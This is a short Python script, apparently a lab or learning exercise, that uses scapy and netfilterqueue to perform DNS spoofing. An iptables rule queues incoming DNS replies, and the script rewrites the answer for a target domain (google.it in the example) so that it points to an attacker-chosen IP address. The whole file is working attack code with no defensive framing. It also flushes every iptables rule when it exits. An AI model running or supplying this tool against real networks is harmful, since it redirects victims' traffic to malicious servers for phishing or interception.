from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP
import netfilterqueue
import os


def dns_response(pkt, interface, redirected_webserver, victim_webserver = None):
    packet = IP(pkt.get_payload())
    if packet.haslayer(DNS):
        print("Got packet", hex(packet[DNS].id))
    if packet.haslayer(DNSRR):
        print("Got DNS response packet")
        qname = packet[DNSQR].qname

        if victim_webserver in qname.decode() or victim_webserver is None:
            #print(packet.show())
            packet[DNSRR].rdata = redirected_webserver
            #print(packet.show())
            
            # Deleted fields will be rebuilt automatically by Scapy with the correct value
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum

            pkt.set_payload(bytes(packet))
            print("DNS packet was modified")
    
    pkt.accept()
    print("Packet forwarded\n")

def dns_attack(interface, redirected_webserver, victim_webserver = None):

    # Setup iptables
    os.system("iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-num 0")

    queue = netfilterqueue.NetfilterQueue()

    # Bind the queue to the nfqueue subsystem, specify the callback function
    queue.bind(0, lambda pkt: dns_response(pkt, interface, redirected_webserver, victim_webserver))

    try:
        # Run the queue
        queue.run()
    except KeyboardInterrupt:

        print("[+] User interrupted.")
        # Flush iptables
        os.system("iptables -F")

        queue.unbind()

    


if __name__ == '__main__':
    dns_attack("wlp0s20f3", "10.20.30.4", "google.it")